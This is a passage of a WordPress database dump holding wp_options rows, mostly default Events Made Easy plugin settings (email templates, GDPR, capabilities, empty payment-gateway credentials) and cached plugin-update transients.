(1625, 'eme_cancel_payment_form_format', 'You\'re about to cancel the following bookings:<br />#_CANCEL_PAYMENT_LINE #_SUBMIT', 'yes'),
(1626, 'eme_cancel_payment_line_format', '#_STARTDATE #_STARTTIME: #_EVENTNAME (#_RESPSEATS seats)<br />', 'yes'),
(1627, 'eme_cancelled_payment_format', 'The following bookings have been cancelled:<br />#_CANCEL_PAYMENT_LINE', 'yes'),
(1628, 'eme_task_reminder_days', '', 'yes'),
(1629, 'eme_rsvp_pending_reminder_days', '', 'yes'),
(1630, 'eme_rsvp_approved_reminder_days', '', 'yes'),
(1631, 'eme_task_registered_users_only', '0', 'yes'),
(1632, 'eme_task_allow_overlap', '0', 'yes'),
(1633, 'eme_task_form_taskentry_format', '#_TASKSIGNUPCHECKBOX #_TASKNAME (#_TASKBEGIN - #_TASKEND) (#_FREETASKSPACES/#_TASKSPACES) <br />', 'yes'),
(1634, 'eme_task_form_format', '<table class=\'eme-rsvp-form\'>\n            <tr><th scope=\'row\'>Last name*:</th><td>#_LASTNAME</td></tr>\n            <tr><th scope=\'row\'>First name*:</th><td>#REQ_FIRSTNAME</td></tr>\n            <tr><th scope=\'row\'>E-Mail*:</th><td>#_EMAIL</td></tr>\n            </table>\n            #_SUBMIT\n            ', 'yes'),
(1635, 'eme_task_signup_format', '#_FULLNAME <br/>', 'yes'),
(1636, 'eme_task_signup_recorded_ok_html', 'You have successfully signed up for this task', 'yes'),
(1637, 'eme_task_signup_cancelled_ok_html', 'You have successfully cancelled your signup for this task', 'yes'),
(1638, 'eme_cp_task_signup_email_subject', 'New signup for task \'#_TASKNAME\' for \'#_EVENTNAME\'', 'yes'),
(1639, 'eme_cp_task_signup_email_body', '#_PERSONFULLNAME (#_PERSONEMAIL) signed up for #_TASKNAME (#_TASKSTARTDATE) for #_EVENTNAME on #_STARTDATE.<br />Now there are #_FREETASKSPACES free spaces for this task.<br /><br />Yours faithfully,<br />Events Manager', 'yes'),
(1640, 'eme_cp_task_signup_cancelled_email_subject', 'A task signup has been cancelled for \'#_EVENTNAME\'', 'yes'),
(1641, 'eme_cp_task_signup_cancelled_email_body', '#_PERSONFULLNAME (#_PERSONEMAIL) has cancelled his signup for #_TASKNAME (#_TASKBEGIN) for #_EVENTNAME on #_STARTDATE.<br />Now there are #_FREETASKSPACES free spaces for this task.<br /><br />Yours faithfully,<br />Events Manager', 'yes'),
(1642, 'eme_task_signup_email_subject', 'Signup for task \'#_TASKNAME\' for \'#_EVENTNAME\'', 'yes'),
(1643, 'eme_task_signup_email_body', 'Dear #_PERSONFULLNAME,<br /><br />You have successfully signed up for #_TASKNAME (#_TASKBEGIN) for #_EVENTNAME.<br /><br />Yours faithfully,<br />#_CONTACTPERSON', 'yes'),
(1644, 'eme_task_signup_cancelled_email_subject', 'Signup for task \'#_TASKNAME\' for \'#_EVENTNAME\' cancelled', 'yes'),
(1645, 'eme_task_signup_cancelled_email_body', 'Dear #_PERSONFULLNAME,<br /><br />Your request to sign up for #_TASKNAME (#_TASKBEGIN) for #_EVENTNAME has been cancelled.<br /><br />Yours faithfully,<br />#_CONTACTPERSON', 'yes'),
(1646, 'eme_task_signup_trashed_email_subject', 'Signup for task \'#_TASKNAME\' for \'#_EVENTNAME\' deleted', 'yes'),
(1647, 'eme_task_signup_trashed_email_body', 'Dear #_PERSONFULLNAME,<br /><br />Your request to sign up for #_TASKNAME (#_TASKBEGIN) for #_EVENTNAME has been deleted.<br /><br />Yours faithfully,<br />#_CONTACTPERSON', 'yes'),
(1648, 'eme_task_signup_reminder_email_subject', 'Reminder: Signup for task \'#_TASKNAME\' for \'#_EVENTNAME\'', 'yes'),
(1649, 'eme_task_signup_reminder_email_body', 'Dear #_PERSONFULLNAME,<br /><br />This is a reminder that you signed up for #_TASKNAME (#_TASKBEGIN) for #_EVENTNAME.<br /><br />Yours faithfully,<br />#_CONTACTPERSON', 'yes'),
(1650, 'eme_bd_email_subject', 'Happy birthday #_PERSONFIRSTNAME', 'yes'),
(1651, 'eme_bd_email_body', 'Hi #_PERSONFIRSTNAME,<br /><br />Congratulations on your birthday!!!<br /><br />From EME', 'yes'),
(1652, 'eme_gdpr_remove_old_attendances_days', '0', 'yes'),
(1653, 'eme_gdpr_remove_expired_member_days', '0', 'yes'),
(1654, 'eme_gdpr_anonymize_old_bookings_days', '0', 'yes'),
(1655, 'eme_gdpr_remove_old_events_days', '0', 'yes'),
(1656, 'eme_gdpr_archive_old_mailings_days', '0', 'yes'),
(1657, 'eme_gdpr_remove_old_signups_days', '0', 'yes'),
(1658, 'eme_gdpr_page_header', '', 'yes'),
(1659, 'eme_gdpr_page_footer', '', 'yes'),
(1660, 'eme_gdpr_page_title', 'Personal info', 'yes'),
(1661, 'eme_gdpr_subject', 'Personal info request', 'yes'),
(1662, 'eme_gdpr_body', 'Hi, please copy/paste this link in your browser to be able to see all your personal info: #_GDPR_URL', 'yes'),
(1663, 'eme_gdpr_approve_page_title', 'GDPR approval', 'yes'),
(1664, 'eme_gdpr_approve_page_content', 'Thank you for allowing us to store your personal info.', 'yes'),
(1665, 'eme_gdpr_approve_subject', 'Personal info approval request', 'yes'),
(1666, 'eme_gdpr_approve_body', 'Hi, please copy/paste this link in your browser to allow us to store your personal info: #_GDPR_APPROVE_URL', 'yes'),
(1667, 'eme_cpi_subject', 'Change personal info request', 'yes'),
(1668, 'eme_cpi_body', 'Hi,<br /><br />Please find below the info needed to change the personal info for each matching person<br/>#_CHANGE_PERSON_INFO<br /><br />Yours faithfully', 'yes'),
(1669, 'eme_cpi_form', 'Last name: #_LASTNAME <br />First name: #_FIRSTNAME <br />Email: #_EMAIL <br />', 'yes'),
(1670, 'eme_sub_subject', 'Subscription request', 'yes'),
(1671, 'eme_sub_body', 'Hi, please copy/paste this link in your browser to subscribe: #_SUB_CONFIRM_URL . This link will expire within one day.', 'yes'),
(1672, 'eme_unsub_subject', 'Unsubscription request', 'yes'),
(1673, 'eme_unsub_body', 'Hi, please copy/paste this link in your browser to unsubscribe: #_UNSUB_CONFIRM_URL . This link will expire within one day.', 'yes'),
(1674, 'eme_cancel_rsvp_days', '0', 'yes'),
(1675, 'eme_cancel_rsvp_age', '0', 'yes'),
(1676, 'eme_rsvp_check_without_accents', '0', 'yes'),
(1677, 'eme_smtp_host', 'localhost', 'yes'),
(1678, 'eme_smtp_port', '25', 'yes'),
(1679, 'eme_smtp_encryption', '', 'yes'),
(1680, 'eme_smtp_verify_cert', '1', 'yes'),
(1681, 'eme_mail_sender_name', '', 'yes'),
(1682, 'eme_mail_sender_address', '', 'yes'),
(1683, 'eme_mail_bcc_address', '', 'yes'),
(1684, 'eme_rsvp_mail_send_method', 'wp_mail', 'yes'),
(1685, 'eme_rsvp_send_html', '1', 'yes'),
(1686, 'eme_rsvp_mail_SMTPAuth', '0', 'yes'),
(1687, 'eme_rsvp_registered_users_only', '0', 'yes'),
(1688, 'eme_rsvp_reg_for_new_events', '0', 'yes'),
(1689, 'eme_rsvp_default_number_spaces', '10', 'yes'),
(1690, 'eme_rsvp_require_approval', '0', 'yes'),
(1691, 'eme_rsvp_require_user_confirmation', '0', 'yes'),
(1692, 'eme_rsvp_show_form_after_booking', '0', 'yes'),
(1693, 'eme_rsvp_hide_full_events', '0', 'yes'),
(1694, 'eme_rsvp_hide_rsvp_ended_events', '0', 'yes'),
(1695, 'eme_rsvp_admin_allow_overbooking', '0', 'yes'),
(1696, 'eme_attendees_list_format', '<li>#_PERSONFULLNAME (#_ATTENDSEATS)</li>', 'yes'),
(1697, 'eme_attendees_list_ignore_pending', '0', 'yes'),
(1698, 'eme_bookings_list_format', '<li>#_PERSONFULLNAME (#_RESPSEATS)</li>', 'yes'),
(1699, 'eme_bookings_list_ignore_pending', '0', 'yes'),
(1700, 'eme_bookings_list_header_format', '<ul class=\'eme_bookings_list_ul\'>', 'yes'),
(1701, 'eme_bookings_list_footer_format', '</ul>', 'yes'),
(1702, 'eme_full_calendar_event_format', '<li>#_LINKEDNAME</li>', 'yes'),
(1703, 'eme_small_calendar_event_title_format', '#_EVENTNAME', 'yes'),
(1704, 'eme_small_calendar_event_title_separator', ', ', 'yes'),
(1705, 'eme_cal_hide_past_events', '0', 'yes'),
(1706, 'eme_cal_show_single', '1', 'yes'),
(1707, 'eme_smtp_debug', '0', 'yes'),
(1708, 'eme_shortcodes_in_widgets', '0', 'yes'),
(1709, 'eme_load_js_in_header', '0', 'yes'),
(1710, 'eme_use_client_clock', '0', 'yes'),
(1711, 'eme_event_list_number_items', '10', 'yes'),
(1712, 'eme_rsvp_enabled', '1', 'yes'),
(1713, 'eme_rsvp_addbooking_submit_string', 'Send your booking', 'yes'),
(1714, 'eme_rsvp_addbooking_min_spaces', '1', 'yes'),
(1715, 'eme_rsvp_addbooking_max_spaces', '10', 'yes'),
(1716, 'eme_rsvp_delbooking_submit_string', 'Cancel your booking', 'yes'),
(1717, 'eme_form_required_field_string', 'Required field', 'yes'),
(1718, 'eme_rsvp_not_yet_allowed_string', 'Bookings not yet allowed on this date.', 'yes'),
(1719, 'eme_rsvp_no_longer_allowed_string', 'Bookings no longer allowed on this date.', 'yes'),
(1720, 'eme_rsvp_cancel_no_longer_allowed_string', 'Cancellations no longer allowed on this date.', 'yes'),
(1721, 'eme_rsvp_full_string', 'Bookings no longer possible: no seats available anymore.', 'yes'),
(1722, 'eme_rsvp_on_waiting_list_string', 'This booking will be put on the waiting list.', 'yes'),
(1723, 'eme_rsvp_login_required_string', 'You need to be logged in in order to be able to register for this event.', 'yes'),
(1724, 'eme_rsvp_invitation_required_string', 'You need to be invited for this event in order to be able to register.', 'yes'),
(1725, 'eme_rsvp_email_already_registered_string', 'This email has already registered.', 'yes'),
(1726, 'eme_rsvp_person_already_registered_string', 'This person has already registered.', 'yes'),
(1727, 'eme_categories_enabled', '1', 'yes'),
(1728, 'eme_cap_list_events', 'edit_posts', 'yes'),
(1729, 'eme_cap_add_event', 'edit_posts', 'yes'),
(1730, 'eme_cap_author_event', 'publish_posts', 'yes'),
(1731, 'eme_cap_publish_event', 'publish_posts', 'yes'),
(1732, 'eme_cap_edit_events', 'edit_others_posts', 'yes'),
(1733, 'eme_cap_manage_task_signups', 'edit_posts', 'yes'),
(1734, 'eme_cap_list_locations', 'read', 'yes'),
(1735, 'eme_cap_add_locations', 'edit_others_posts', 'yes'),
(1736, 'eme_cap_author_locations', 'delete_others_posts', 'yes'),
(1737, 'eme_cap_edit_locations', 'read', 'yes'),
(1738, 'eme_cap_categories', 'activate_plugins', 'yes'),
(1739, 'eme_cap_holidays', 'activate_plugins', 'yes'),
(1740, 'eme_cap_templates', 'activate_plugins', 'yes'),
(1741, 'eme_cap_access_people', 'edit_posts', 'yes'),
(1742, 'eme_cap_list_people', 'edit_others_posts', 'yes'),
(1743, 'eme_cap_edit_people', 'edit_others_posts', 'yes'),
(1744, 'eme_cap_author_person', 'edit_posts', 'yes'),
(1745, 'eme_cap_access_members', 'read', 'yes'),
(1746, 'eme_cap_list_members', 'read', 'yes'),
(1747, 'eme_cap_edit_members', 'edit_others_posts', 'yes'),
(1748, 'eme_cap_author_member', 'edit_posts', 'yes'),
(1749, 'eme_cap_discounts', 'edit_posts', 'yes'),
(1750, 'eme_cap_list_approve', 'read', 'yes'),
(1751, 'eme_cap_author_approve', 'read', 'yes'),
(1752, 'eme_cap_approve', 'edit_others_posts', 'yes'),
(1753, 'eme_cap_list_registrations', 'edit_posts', 'yes'),
(1754, 'eme_cap_author_registrations', 'edit_posts', 'yes'),
(1755, 'eme_cap_registrations', 'edit_others_posts', 'yes'),
(1756, 'eme_cap_attendancecheck', 'edit_posts', 'yes'),
(1757, 'eme_cap_membercheck', 'edit_posts', 'yes'),
(1758, 'eme_cap_forms', 'edit_others_posts', 'yes'),
(1759, 'eme_cap_cleanup', 'activate_plugins', 'yes'),
(1760, 'eme_cap_settings', 'activate_plugins', 'yes'),
(1761, 'eme_cap_send_mails', 'edit_posts', 'yes'),
(1762, 'eme_cap_send_other_mails', 'edit_posts', 'yes'),
(1763, 'eme_cap_list_attendances', 'edit_posts', 'yes'),
(1764, 'eme_cap_manage_attendances', 'edit_posts', 'yes'),
(1765, 'eme_html_header', '', 'yes'),
(1766, 'eme_html_footer', '', 'yes'),
(1767, 'eme_event_html_headers_format', '', 'yes'),
(1768, 'eme_location_html_headers_format', '', 'yes'),
(1769, 'eme_offline_payment', '', 'yes'),
(1770, 'eme_legacypaypal_url', 'live', 'yes'),
(1771, 'eme_legacypaypal_business', '', 'yes'),
(1772, 'eme_legacypaypal_no_tax', '0', 'yes'),
(1773, 'eme_legacypaypal_cost', '0', 'yes'),
(1774, 'eme_legacypaypal_cost2', '0', 'yes'),
(1775, 'eme_legacypaypal_button_label', 'Pay via Paypal', 'yes'),
(1776, 'eme_legacypaypal_button_img_url', '', 'yes'),
(1777, 'eme_legacypaypal_button_above', '<br />You can pay via Paypal. If you wish to do so, click the button below.', 'yes'),
(1778, 'eme_legacypaypal_button_below', '', 'yes'),
(1779, 'eme_paypal_url', 'live', 'yes'),
(1780, 'eme_paypal_clientid', '', 'yes'),
(1781, 'eme_paypal_secret', '', 'yes'),
(1782, 'eme_paypal_cost', '0', 'yes'),
(1783, 'eme_paypal_cost2', '0', 'yes'),
(1784, 'eme_paypal_button_label', 'Pay via Paypal', 'yes'),
(1785, 'eme_paypal_button_img_url', '', 'yes'),
(1786, 'eme_paypal_button_above', '<br />You can pay via Paypal. If you wish to do so, click the button below.', 'yes'),
(1787, 'eme_paypal_button_below', '', 'yes'),
(1788, 'eme_2co_demo', '0', 'yes'),
(1789, 'eme_2co_business', '', 'yes'),
(1790, 'eme_2co_secret', '', 'yes'),
(1791, 'eme_2co_cost', '0', 'yes'),
(1792, 'eme_2co_cost2', '0', 'yes'),
(1793, 'eme_2co_button_label', 'Pay via 2Checkout', 'yes'),
(1794, 'eme_2co_button_img_url', '', 'yes'),
(1795, 'eme_2co_button_above', '<br />You can pay via 2Checkout. If you wish to do so, click the button below.', 'yes'),
(1796, 'eme_2co_button_below', '', 'yes'),
(1797, 'eme_webmoney_demo', '0', 'yes'),
(1798, 'eme_webmoney_purse', '', 'yes'),
(1799, 'eme_webmoney_secret', '', 'yes'),
(1800, 'eme_webmoney_cost', '0', 'yes'),
(1801, 'eme_webmoney_cost2', '0', 'yes'),
(1802, 'eme_webmoney_button_label', 'Pay via Webmoney', 'yes'),
(1803, 'eme_webmoney_button_img_url', '', 'yes'),
(1804, 'eme_webmoney_button_above', '<br />You can pay via Webmoney. If you wish to do so, click the button below.', 'yes'),
(1805, 'eme_webmoney_button_below', '', 'yes'),
(1806, 'eme_worldpay_demo', '1', 'yes'),
(1807, 'eme_worldpay_instid', '', 'yes'),
(1808, 'eme_worldpay_md5_secret', '', 'yes'),
(1809, 'eme_worldpay_md5_parameters', 'instId:cartId:currency:amount', 'yes'),
(1810, 'eme_worldpay_test_pwd', '', 'yes'),
(1811, 'eme_worldpay_live_pwd', '', 'yes'),
(1812, 'eme_worldpay_cost', '0', 'yes'),
(1813, 'eme_worldpay_cost2', '0', 'yes'),
(1814, 'eme_worldpay_button_label', 'Pay via Worldpay', 'yes'),
(1815, 'eme_worldpay_button_img_url', '', 'yes'),
(1816, 'eme_worldpay_button_above', '<br />You can pay via Worldpay. If you wish to do so, click the button below.', 'yes'),
(1817, 'eme_worldpay_button_below', '', 'yes'),
(1818, 'eme_braintree_private_key', '', 'yes'),
(1819, 'eme_braintree_public_key', '', 'yes'),
(1820, 'eme_braintree_merchant_id', '', 'yes'),
(1821, 'eme_braintree_env', 'production', 'yes'),
(1822, 'eme_braintree_cost', '0', 'yes'),
(1823, 'eme_braintree_cost2', '0', 'yes'),
(1824, 'eme_braintree_button_label', 'Pay via Braintree', 'yes'),
(1825, 'eme_braintree_button_img_url', '', 'yes'),
(1826, 'eme_braintree_button_above', '<br />You can pay via Braintree. If you wish to do so, click the button below.', 'yes'),
(1827, 'eme_braintree_button_below', '', 'yes'),
(1828, 'eme_instamojo_env', 'sandbox', 'yes'),
(1829, 'eme_instamojo_key', '', 'yes'),
(1830, 'eme_instamojo_auth_token', '', 'yes'),
(1831, 'eme_instamojo_salt', '', 'yes'),
(1832, 'eme_instamojo_cost', '0', 'yes'),
(1833, 'eme_Instamojo_cost2', '0', 'yes'),
(1834, 'eme_instamojo_button_label', 'Pay via Instamojo', 'yes'),
(1835, 'eme_instamojo_button_img_url', '', 'yes'),
(1836, 'eme_instamojo_button_above', '<br />You can pay via Instamojo. If you wish to do so, click the button below.', 'yes'),
(1837, 'eme_instamojo_button_below', '', 'yes'),
(1838, 'eme_stripe_private_key', '', 'yes'),
(1839, 'eme_stripe_public_key', '', 'yes'),
(1840, 'eme_stripe_cost', '0', 'yes'),
(1841, 'eme_stripe_cost2', '0', 'yes'),
(1842, 'eme_stripe_button_label', 'Pay via Stripe', 'yes'),
(1843, 'eme_stripe_button_img_url', '', 'yes'),
(1844, 'eme_stripe_button_above', '<br />You can pay via Stripe. If you wish to do so, click the button below.', 'yes'),
(1845, 'eme_stripe_button_below', '', 'yes'),
(1846, 'eme_stripe_payment_methods', 'card', 'yes'),
(1847, 'eme_fdgg_url', 'live', 'yes'),
(1848, 'eme_fdgg_store_name', '', 'yes'),
(1849, 'eme_fdgg_shared_secret', '', 'yes'),
(1850, 'eme_fdgg_cost', '0', 'yes'),
(1851, 'eme_fdgg_cost2', '0', 'yes'),
(1852, 'eme_fdgg_button_label', 'Pay via First Data', 'yes'),
(1853, 'eme_fdgg_button_img_url', '', 'yes'),
(1854, 'eme_fdgg_button_above', '<br />You can pay via First Data. If you wish to do so, click the button below.', 'yes'),
(1855, 'eme_fdgg_button_below', '', 'yes'),
(1856, 'eme_mollie_api_key', '', 'yes'),
(1857, 'eme_mollie_cost', '0', 'yes'),
(1858, 'eme_mollie_cost2', '0', 'yes'),
(1859, 'eme_mollie_button_label', 'Pay via Mollie', 'yes'),
(1860, 'eme_mollie_button_img_url', '', 'yes'),
(1861, 'eme_mollie_button_above', '<br />You can pay via Mollie. If you wish to do so, click the button below.', 'yes'),
(1862, 'eme_mollie_button_below', 'Using Mollie, you can pay using one of the following methods:<br />', 'yes'),
(1863, 'eme_payconiq_api_key', '', 'yes'),
(1864, 'eme_payconiq_env', '', 'yes'),
(1865, 'eme_payconiq_merchant_id', '', 'yes'),
(1866, 'eme_payconiq_cost', '0', 'yes'),
(1867, 'eme_payconiq_cost2', '0', 'yes'),
(1868, 'eme_payconiq_button_label', 'Pay via Payconiq', 'yes'),
(1869, 'eme_payconiq_button_img_url', 'images/payment_gateways/payconiq/logo.png', 'yes'),
(1870, 'eme_payconiq_button_above', '<br />You can pay via Payconiq. If you wish to do so, click the button below.', 'yes'),
(1871, 'eme_payconiq_button_below', '', 'yes'),
(1872, 'eme_mercadopago_demo', '1', 'yes'),
(1873, 'eme_mercadopago_sandbox_token', '', 'yes'),
(1874, 'eme_mercadopago_live_token', '', 'yes'),
(1875, 'eme_mercadopago_cost', '0', 'yes'),
(1876, 'eme_mercadopago_cost2', '0', 'yes'),
(1877, 'eme_mercadopago_button_label', 'Pay via Mercado Pago', 'yes'),
(1878, 'eme_mercadopago_button_img_url', '', 'yes'),
(1879, 'eme_mercadopago_button_above', '<br />You can pay via Mercado Pago. If you wish to do so, click the button below.', 'yes'),
(1880, 'eme_mercadopago_button_below', '', 'yes'),
(1881, 'eme_fondy_merchant_id', '', 'yes'),
(1882, 'eme_fondy_secret_key', '', 'yes'),
(1883, 'eme_fondy_cost', '0', 'yes'),
(1884, 'eme_fondy_cost2', '0', 'yes'),
(1885, 'eme_fondy_button_label', 'Pay via Fondy', 'yes'),
(1886, 'eme_fondy_button_img_url', '', 'yes'),
(1887, 'eme_fondy_button_above', '<br />You can pay via Fondy. If you wish to do so, click the button below.', 'yes'),
(1888, 'eme_fondy_button_below', '', 'yes'),
(1889, 'eme_event_initial_state', '5', 'yes'),
(1890, 'eme_use_external_url', '1', 'yes'),
(1891, 'eme_bd_email', '0', 'yes'),
(1892, 'eme_bd_email_members_only', '0', 'yes'),
(1893, 'eme_default_currency', 'EUR', 'yes'),
(1894, 'eme_default_vat', '0', 'yes'),
(1895, 'eme_default_price', '0', 'yes'),
(1896, 'eme_payment_refund_ok', '1', 'yes'),
(1897, 'eme_pg_submit_immediately', '0', 'yes'),
(1898, 'eme_payment_redirect', '1', 'yes'),
(1899, 'eme_payment_redirect_wait', '5', 'yes'),
(1900, 'eme_payment_redirect_msg', 'You will be redirected to the payment page in a few seconds, or click <a href=\"#_PAYMENT_URL\">here</a> to go there immediately', 'yes'),
(1901, 'eme_rsvp_number_days', '0', 'yes'),
(1902, 'eme_rsvp_number_hours', '0', 'yes'),
(1903, 'eme_thumbnail_size', 'thumbnail', 'yes'),
(1904, 'eme_payment_form_header_format', '', 'yes'),
(1905, 'eme_payment_form_footer_format', '', 'yes'),
(1906, 'eme_multipayment_form_header_format', '', 'yes'),
(1907, 'eme_multipayment_form_footer_format', '', 'yes'),
(1908, 'eme_payment_succes_format', 'Payment success for your booking for #_EVENTNAME', 'yes'),
(1909, 'eme_payment_fail_format', 'Payment failed for your booking for #_EVENTNAME', 'yes'),
(1910, 'eme_payment_member_succes_format', 'Payment success for your membership signup for #_MEMBERSHIPNAME', 'yes'),
(1911, 'eme_payment_member_fail_format', 'Payment failed for your membership signup for #_MEMBERSHIPNAME', 'yes'),
(1912, 'eme_payment_booking_already_paid_format', 'This has already been paid for', 'yes'),
(1913, 'eme_payment_booking_on_waitinglist_format', 'This booking is on a waitinglist, payment is not possible.', 'yes'),
(1914, 'eme_enable_notes_placeholders', '0', 'yes'),
(1915, 'eme_uninstall_drop_data', '0', 'yes'),
(1916, 'eme_uninstall_drop_settings', '0', 'yes'),
(1917, 'eme_csv_separator', ';', 'yes'),
(1918, 'eme_decimals', '2', 'yes'),
(1919, 'eme_timepicker_minutesstep', '5', 'yes'),
(1920, 'eme_localize_price', '1', 'yes'),
(1921, 'eme_autocomplete_sources', 'none', 'yes'),
(1922, 'eme_cron_cleanup_unpaid_minutes', '0', 'yes'),
(1923, 'eme_cron_cleanup_unconfirmed_minutes', '0', 'yes'),
(1924, 'eme_cron_queue_count', '50', 'yes'),
(1925, 'eme_queue_mails', '1', 'yes'),
(1926, 'eme_people_newsletter', '1', 'yes'),
(1927, 'eme_people_massmail', '0', 'yes'),
(1928, 'eme_massmail_popup', '1', 'yes'),
(1929, 'eme_massmail_popup_text', 'You selected to not receive future mails. Are you sure about this?', 'yes'),
(1930, 'eme_add_events_locs_link_search', '0', 'yes'),
(1931, 'eme_booking_attach_ids', '', 'yes'),
(1932, 'eme_pending_attach_ids', '', 'yes'),
(1933, 'eme_paid_attach_ids', '', 'yes'),
(1934, 'eme_subscribe_attach_ids', '', 'yes'),
(1935, 'eme_allowed_html', '', 'yes'),
(1936, 'eme_allowed_style_attr', '', 'yes'),
(1937, 'eme_redir_priv_event_url', '', 'yes'),
(1938, 'eme_redir_protected_pages_url', '', 'yes'),
(1939, 'eme_full_name_format', '#_FIRSTNAME #_LASTNAME', 'yes'),
(1940, 'eme_pdf_font', 'dejavu sans', 'yes'),
(1941, 'eme_frontend_nocache', '0', 'yes'),
(1942, 'eme_use_is_page_for_title', '0', 'yes'),
(1943, 'eme_mail_tracking', '0', 'yes'),
(1944, 'eme_backend_dateformat', '', 'yes'),
(1945, 'eme_backend_timeformat', '', 'yes'),
(1946, 'eme_check_free_waiting', '0', 'yes'),
(1947, 'eme_unique_email_per_person', '0', 'yes'),
(1948, 'eme_events_page', '60', 'yes'),
(1949, 'eme_cron_send_queued', 'hourly', 'yes'),
(1950, 'eme_version', '351', 'yes'),
(2104, 'no_of_wp_limit_login_attepts', '5', 'yes'),
(2105, 'limit_login_attepts_delay_time', '10', 'yes'),
(2106, 'limit_login_attepts_captcha', '3', 'yes'),
(2107, 'limit_login_captcha', 'checked', 'yes'),
(2108, 'limit_login_install_date', '2022-10-24 13:53:09', 'yes'),
(2119, '_transient_timeout_gwolle_gb_menu_counter', '1667054508', 'no'),
(2120, '_transient_gwolle_gb_menu_counter', '0', 'no'),
(2156, '_site_transient_timeout_theme_roots', '1667051826', 'no'),
(2157, '_site_transient_theme_roots', 'a:5:{s:8:\"exs-dark\";s:7:\"/themes\";s:3:\"exs\";s:7:\"/themes\";s:12:\"twentytwenty\";s:7:\"/themes\";s:15:\"twentytwentyone\";s:7:\"/themes\";s:15:\"twentytwentytwo\";s:7:\"/themes\";}', 'no'),
(2158, '_site_transient_update_plugins', 'O:8:\"stdClass\":5:{s:12:\"last_checked\";i:1667050028;s:8:\"response\";a:1:{s:35:\"events-made-easy/events-manager.php\";O:8:\"stdClass\":12:{s:2:\"id\";s:30:\"w.org/plugins/events-made-easy\";s:4:\"slug\";s:16:\"events-made-easy\";s:6:\"plugin\";s:35:\"events-made-easy/events-manager.php\";s:11:\"new_version\";s:5:\"2.3.5\";s:3:\"url\";s:47:\"https://wordpress.org/plugins/events-made-easy/\";s:7:\"package\";s:65:\"https://downloads.wordpress.org/plugin/events-made-easy.2.3.5.zip\";s:5:\"icons\";a:2:{s:2:\"2x\";s:69:\"https://ps.w.org/events-made-easy/assets/icon-256x256.png?rev=1856035\";s:2:\"1x\";s:69:\"https://ps.w.org/events-made-easy/assets/icon-128x128.png?rev=1856059\";}s:7:\"banners\";a:1:{s:2:\"1x\";s:71:\"https://ps.w.org/events-made-easy/assets/banner-772x250.png?rev=2070124\";}s:11:\"banners_rtl\";a:0:{}s:8:\"requires\";s:3:\"5.4\";s:6:\"tested\";s:3:\"6.1\";s:12:\"requires_php\";b:0;}}s:12:\"translations\";a:0:{}s:9:\"no_update\";a:2:{s:23:\"gwolle-gb/gwolle-gb.php\";O:8:\"stdClass\":10:{s:2:\"id\";s:23:\"w.org/plugins/gwolle-gb\";s:4:\"slug\";s:9:\"gwolle-gb\";s:6:\"plugin\";s:23:\"gwolle-gb/gwolle-gb.php\";s:11:\"new_version\";s:5:\"4.3.0\";s:3:\"url\";s:40:\"https://wordpress.org/plugins/gwolle-gb/\";s:7:\"package\";s:58:\"https://downloads.wordpress.org/plugin/gwolle-gb.4.3.0.zip\";s:5:\"icons\";a:2:{s:2:\"2x\";s:62:\"https://ps.w.org/gwolle-gb/assets/icon-256x256.png?rev=1114688\";s:2:\"1x\";s:62:\"https://ps.w.org/gwolle-gb/assets/icon-128x128.png?rev=1114688\";}s:7:\"banners\";a:1:{s:2:\"1x\";s:64:\"https://ps.w.org/gwolle-gb/assets/banner-772x250.png?rev=1085084\";}s:11:\"banners_rtl\";a:1:{s:2:\"1x\";s:68:\"https://ps.w.org/gwolle-gb/assets/banner-772x250-rtl.png?rev=1284955\";}s:8:\"requires\";s:3:\"4.1\";}s:51:\"wp-limit-login-attempts/wp-limit-login-attempts.php\";O:8:\"stdClass\":10:{s:2:\"id\";s:37:\"w.org/plugins/wp-limit-login-attempts\";s:4:\"slug\";s:23:\"wp-limit-login-attempts\";s:6:\"plugin\";s:51:\"wp-limit-login-attempts/wp-limit-login-attempts.php\";s:11:\"new_version\";s:5:\"2.6.4\";s:3:\"url\";s:54:\"https://wordpress.org/plugins/wp-limit-login-attempts/\";s:7:\"package\";s:66:\"https://downloads.wordpress.org/plugin/wp-limit-login-attempts.zip\";s:5:\"icons\";a:2:{s:2:\"2x\";s:76:\"https://ps.w.org/wp-limit-login-attempts/assets/icon-256x256.png?rev=1225433\";s:2:\"1x\";s:76:\"https://ps.w.org/wp-limit-login-attempts/assets/icon-128x128.png?rev=1225433\";}s:7:\"banners\";a:1:{s:2:\"1x\";s:78:\"https://ps.w.org/wp-limit-login-attempts/assets/banner-772x250.png?rev=1225433\";}s:11:\"banners_rtl\";a:0:{}s:8:\"requires\";b:0;}}s:7:\"checked\";a:3:{s:35:\"events-made-easy/events-manager.php\";s:6:\"2.2.80\";s:23:\"gwolle-gb/gwolle-gb.php\";s:5:\"4.3.0\";s:51:\"wp-limit-login-attempts/wp-limit-login-attempts.php\";s:5:\"2.6.4\";}}', 'no'),
(2159, '_transient_health-check-site-status-result', '{\"good\":15,\"recommended\":3,\"critical\":1}', 'yes'),
(2160, '_site_transient_timeout_community-events-457e6c90cd2f372ed464cccaaa5cde16', '1667093412', 'no'),
(2161, '_site_transient_community-events-457e6c90cd2f372ed464cccaaa5cde16', 'a:4:{s:9:\"sandboxed\";b:0;s:5:\"error\";N;s:8:\"location\";a:1:{s:2:\"ip\";s:10:\"172.24.0.0\";}s:6:\"events\";a:0:{}}', 'no'),
(2162, '_transient_timeout_feed_9bbd59226dc36b9b26cd43f15694c5c3', '1667093248', 'no');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
